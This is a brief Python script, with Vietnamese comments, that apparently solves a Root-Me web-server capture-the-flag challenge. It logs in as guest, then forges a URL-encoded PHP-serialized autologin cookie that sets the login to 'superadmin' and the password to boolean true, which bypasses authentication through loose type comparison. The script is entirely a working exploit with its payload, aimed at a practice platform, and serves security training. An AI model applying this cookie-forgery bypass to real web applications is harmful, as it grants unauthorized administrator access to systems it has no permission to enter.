import requests
from urllib.parse import quote

login = {'login':'guest','password':'guest', 'autologin':1} # lấy Set-Cookie autologin
r = requests.post('http://challenge01.root-me.org/web-serveur/ch28/index.php', data=login)

# Set-Cookie: Là cookie server trả về để lần sau dùng cookie này autologin
print("Set-Cookie: ", r.headers['Set-Cookie'])

# urldecode autologin cookie, edit payload
payload = 'a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}'
urlencode = quote(payload) # r'' : escapse sequence

autologin = {'Cookie':'autologin='+urlencode} # Header Cookie not Set_Cookie
print("\n\n", autologin, end='\n\n')

r_autologin = requests.get('http://challenge01.root-me.org/web-serveur/ch28/index.php', headers=autologin)
print(r_autologin.text)